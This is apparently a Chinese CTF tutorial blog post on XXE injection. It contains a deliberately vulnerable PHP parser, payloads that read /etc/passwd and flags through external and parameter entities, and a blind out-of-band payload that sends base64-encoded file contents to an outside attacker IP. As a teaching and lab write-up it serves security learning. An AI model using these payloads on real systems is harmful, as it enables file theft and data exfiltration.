---
title: XXE漏洞入门
date: 2026-02-14 18:12:36
tags:
index_img: https://gitee.com/bobrocket/img/raw/master/img/image-20260304222831454.png
categories: CTF
---

## 前置知识

### 漏洞成因

解析时未对XML外部实体加以限制，导致攻击者将恶意代码注入到XML中，导致服务器加载恶意的外部实体引发文件读取，SSRF，命令执行等危害操作

### 漏洞特征

在HTTP的Request报文出现一下请求报文，即表明此时是采用XML进行数据传输，就可以测试是否存在XML漏洞。

```
Content-type:text/xml application/xml
```

### DTD

#### 内部实体（无利用价值）

```xml-dtd
<!ENTITY 实体名称 "实体的值">

例如：
<!DOCTYPE foo [
	<!ELEMENT foo ANY >
	<!ENTITY xxe "hello">
]>
<foo>&xxe;</foo>
```

#### 外部实体

```xml-dtd
有SYSTEM和PUBLIC两个关键字，表示实体来自本地计算机还是公共计算机，
外部实体的引用可以利用如下协议
file:///path/to/file.ext
http://url/file.ext
php://filter/read=convert.base64-encode/resource=conf.php


例如:
<!DOCTYPE foo [
	<!ELEMENT foo ANY >
	<!ENTITY  % xxe SYSTEM "http://xxx.xxx.xxx/evil.dtd" >
%xxe;
]>
<foo>&evil;</foo>

外部evil.dtd中的内容
<!ENTITY evil SYSTEM “file:///d:/1.txt” >
```

### 漏洞利用

#### 漏洞演示

```php
<?php
error_reporting(0);
libxml_disable_entity_loader(false);
$xml = file_get_contents('php://input');//读取请求体中的xml内容
if(isset($xml)){
    $dom = new DOMDocument();
    $dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);//加载解析xml
    $creds = simplexml_import_dom($dom);
    $benben = $creds->admin;//获取<admin>节点的内容
    echo $benben;
}
highlight_file(__FILE__);
```

通过提交xml，可以显示想要的内容，利用伪协议读文件

![image-20260224155221058](https://gitee.com/bobrocket/img/raw/master/img/image-20260224155221058.png)

不同的语言支持的伪协议不同

![image-20260224155245331](https://gitee.com/bobrocket/img/raw/master/img/image-20260224155245331.png)

#### 使用外部实体检索文件

如何判断xxe？bp抓包

![image-20260224172006057](https://gitee.com/bobrocket/img/raw/master/img/image-20260224172006057.png)

分析报文，发现漏洞注入位置

![image-20260224172537714](https://gitee.com/bobrocket/img/raw/master/img/image-20260224172537714.png)

构造payload

![image-20260224172717803](https://gitee.com/bobrocket/img/raw/master/img/image-20260224172717803.png)

#### 使用参数实体读取文件

```
<!ENTITY suny SYSTEM "file:///etc/passwd">
```

传入服务器，开启http服务

```xml-dtd
<!DOCTYPE user [<!ENTITY % suny SYSTEM "http://183.66.27.22:18546/1.dtd" >%suny;]>
<user><username>&suny;</username><password>suny</password></user>
```

![image-20260224184224465](https://gitee.com/bobrocket/img/raw/master/img/image-20260224184224465.png)

#### 无回显XXE外带数据

内部DTD禁止参数实体再次调用参数实体，所以我们依旧把它放到服务器上

```dtd
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://183.66.27.22:42916/?p=%file;'>">
```

服务器开启监听，在靶机上发送

```xml-dtd
<!DOCTYPE conver [
<!ENTITY % remote SYSTEM "http://183.66.27.22:18546/2.dtd">
%remote;
%int;
%send;
]>
<user><username>suny</username><password>suny</password></user>
```

这样就把数据外带出来了

![image-20260224193302032](https://gitee.com/bobrocket/img/raw/master/img/image-20260224193302032.png)

## 实战

## [CSAWQual 2019]Web_Unagi

upload页面可以上传xml文件，直接构造payload

```xml-dtd
<?xml version='1.0'?>
<!DOCTYPE users [
<!ENTITY admin SYSTEM "file:///flag">]>
<users>
    <user>
        <username>111</username>
        <password>111</password>
        <name> 111</name>
        <email>1111@fakesite.com</email>
        <group>CSAW2019</group>
        <intro>&admin;</intro>
    </user>
</users>
```

![image-20260224194208960](https://gitee.com/bobrocket/img/raw/master/img/image-20260224194208960.png)
